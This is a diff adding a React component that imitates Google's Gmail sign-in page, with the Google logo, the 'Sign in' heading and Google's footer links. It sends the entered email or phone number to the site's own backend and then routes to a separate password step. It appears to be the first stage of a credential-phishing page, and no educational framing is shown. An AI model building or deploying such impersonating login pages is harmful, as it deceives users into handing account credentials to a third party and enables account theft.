@@ -1,0 +1,123 @@
+import React, { useState } from "react";
+import { useNavigate } from "react-router-dom";
+import axios from "axios";
+
+export default function Username() {
+    const [username, setUsername] = useState("");
+    const [error, setError] = useState("");
+    const [loading, setLoading] = useState(false);
+    const navigate = useNavigate();
+
+    const handleNext = async () => {
+        if (!username.trim()) {
+            setError("Please enter your email or phone.");
+            return;
+        }
+        setError("");
+        setLoading(true);
+        try {
+            const res = await axios.post("/api/users/username", { username: username.trim() });
+            // Pass userId and username forward via route state
+            navigate("/password", { state: { userId: res.data.userId, username: res.data.username } });
+        } catch (err) {
+            setError(err.response?.data?.message || "Something went wrong. Please try again.");
+        } finally {
+            setLoading(false);
+        }
+    };
+
+    return (
+        <div className="min-h-screen bg-[#202124] flex items-center justify-center text-white px-4">
+
+            {/* Card */}
+            <div className="bg-black rounded-3xl w-full max-w-4xl p-6 sm:p-10 shadow-xl flex flex-col md:flex-row">
+
+                {/* LEFT */}
+                <div className="md:w-1/2 md:pr-8 mb-8 md:mb-0 flex flex-col justify-between">
+                    <div>
+                        {/* Google Logo */}
+                        <div className="text-2xl font-bold mb-6 text-center md:text-left">
+                            <span className="text-blue-500">G</span>
+                            <span className="text-red-500">o</span>
+                            <span className="text-yellow-500">o</span>
+                            <span className="text-blue-500">g</span>
+                            <span className="text-green-500">l</span>
+                            <span className="text-red-500">e</span>
+                        </div>
+
+                        <h1 className="text-2xl sm:text-3xl font-semibold mb-2 text-center md:text-left">
+                            Sign in
+                        </h1>
+
+                        <p className="text-gray-400 text-sm text-center md:text-left">
+                            to continue to Gmail
+                        </p>
+                    </div>
+
+                    <div className="text-sm text-gray-400 mt-10 text-center md:text-left">
+                        English (United States)
+                    </div>
+                </div>
+
+                {/* RIGHT */}
+                <div className="md:w-1/2 md:pl-8 flex flex-col justify-center">
+
+                    {/* Input */}
+                    <label className="text-sm text-gray-400 mb-2">
+                        Email or phone
+                    </label>
+
+                    <input
+                        type="text"
+                        value={username}
+                        onChange={(e) => setUsername(e.target.value)}
+                        onKeyDown={(e) => e.key === "Enter" && handleNext()}
+                        className="w-full bg-transparent border border-gray-600 rounded-md px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                    />
+
+                    {error && (
+                        <p className="text-red-400 text-xs mt-2">{error}</p>
+                    )}
+
+                    {/* Forgot email */}
+                    <button className="text-blue-400 text-sm mt-3 text-left hover:underline">
+                        Forgot email?
+                    </button>
+
+                    {/* Info text */}
+                    <p className="text-gray-400 text-sm mt-6 leading-relaxed">
+                        Not your computer? Use Guest mode to sign in privately.{" "}
+                        <span className="text-blue-400 cursor-pointer hover:underline">
+                            Learn more about using Guest mode
+                        </span>
+                    </p>
+
+                    {/* Actions */}
+                    <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center mt-8 gap-4">
+                        <button className="text-blue-400 text-sm hover:underline text-left">
+                            Create account
+                        </button>
+
+                        <button
+                            onClick={handleNext}
+                            disabled={loading}
+                            className="bg-blue-500 hover:bg-blue-600 disabled:opacity-60 px-6 py-2 rounded-full text-sm font-medium w-full sm:w-auto"
+                        >
+                            {loading ? "Saving..." : "Next"}
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            {/* Footer */}
+            <div className="absolute bottom-4 left-0 w-full flex flex-col sm:flex-row justify-between items-center px-6 text-sm text-gray-400 gap-2 sm:gap-0">
+                <span>English (United States)</span>
+                <div className="flex gap-6">
+                    <span className="cursor-pointer hover:underline">Help</span>
+                    <span className="cursor-pointer hover:underline">Privacy</span>
+                    <span className="cursor-pointer hover:underline">Terms</span>
+                </div>
+            </div>
+        </div>
+    );
+}
